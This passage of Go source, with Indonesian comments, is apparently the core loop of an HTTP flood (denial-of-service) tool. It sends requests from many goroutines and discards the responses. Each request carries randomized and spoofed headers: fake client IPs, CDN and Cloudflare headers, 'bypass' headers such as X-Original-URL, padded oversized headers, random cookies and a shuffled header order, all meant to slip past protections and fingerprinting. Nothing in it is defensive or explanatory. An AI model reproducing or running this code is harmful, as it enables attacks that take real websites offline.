				headers = append(headers, headerItem{"Sec-Fetch-Mode", prof.SecFetchMode})
				headers = append(headers, headerItem{"Sec-Fetch-Dest", prof.SecFetchDest})
				if prof.DNT != "" {
					headers = append(headers, headerItem{"DNT", prof.DNT})
				}

				// Header acak tambahan
				if rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"TE", "trailers"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"A-IM", "Feed"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Delta-Base", "12340001"})
				}
				if rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"dnt", "1"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Access-Control-Request-Method", "GET"})
				}
				if rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"source-ip", RST(rng, 5)})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Data-Return", "false"})
				}

				// Header bypass (dikirim tanpa if, langsung semua)
				if Supported["X-Original-URL"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Original-URL", "/" + strconv.FormatInt(rng.Int63(), 16)})
				}
				if Supported["X-Forwarded-Host"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16) + "t.me/ytdizflyze"})
				}
				if Supported["X-Request-ID"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Request-ID", strconv.FormatInt(rng.Int63(), 16)})
				}
				if Supported["CF-Connecting-IP"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"CF-Connecting-IP", realIP})
				}
				if Supported["True-Client-IP"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"True-Client-IP", realIP})
				}
				if Supported["CDN-Loop"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"CDN-Loop", "cloudflare"})
				}
				if rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"X-Real-IP", realIP})
				}
				if MaxHead > 0 && rng.Intn(2) == 0 {
					size := MaxHead/2 + rng.Intn(MaxHead/2)
					if size < 1 {
						size = 512
					}
					headers = append(headers, headerItem{"X-Large-Data", strings.Repeat("x", size)})
				}

				// Cookie
				var cookies []string
				if CCK != "" {
					cookies = append(cookies, CCK)
				}
				for _, name := range COOKIES {
					if rng.Intn(2) == 0 {
						cookies = append(cookies, name+"="+strconv.FormatInt(rng.Int63(), 16))
					}
				}
				if len(cookies) > 0 {
					headers = append(headers, headerItem{"Cookie", strings.Join(cookies, "; ")})
				}

				// IP header
				headers = append(headers, headerItem{"X-Forwarded-For", realIP})
				headers = append(headers, headerItem{"X-Real-IP", realIP})

				// ===== POIN 5: Range header =====
				headers = append(headers, headerItem{"Range", "bytes=0-"})

				// ===== POIN 7: header tambahan =====
				headers = append(headers, headerItem{"If-None-Match", `"` + RST(rng, 16) + `"`})
				headers = append(headers, headerItem{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"})
				headers = append(headers, headerItem{"Accept-Language", "en-US,en;q=0.9,id;q=0.8"})
				headers = append(headers, headerItem{"X-Forwarded-For", realIP + ", " + RIP(rng)})
				headers = append(headers, headerItem{"X-Originating-IP", realIP})
				headers = append(headers, headerItem{"X-Remote-IP", realIP})
				headers = append(headers, headerItem{"X-Remote-Addr", realIP})
				headers = append(headers, headerItem{"X-Client-IP", realIP})

				// ===== DYNAMIC HEADER ORDERING =====
				// Acak urutan header
				rng.Shuffle(len(headers), func(i, j int) {
					headers[i], headers[j] = headers[j], headers[i]
				})
				// Kosongkan header bawaan, lalu set ulang dengan urutan acak
				req.Header = make(http.Header)
				for _, h := range headers {
					req.Header.Set(h.key, h.value)
				}

				// Kirim request
				resp, err := cli.client.Do(req)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
			}
		}(c, i)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg2.Wait()
	fmt.Println()
}
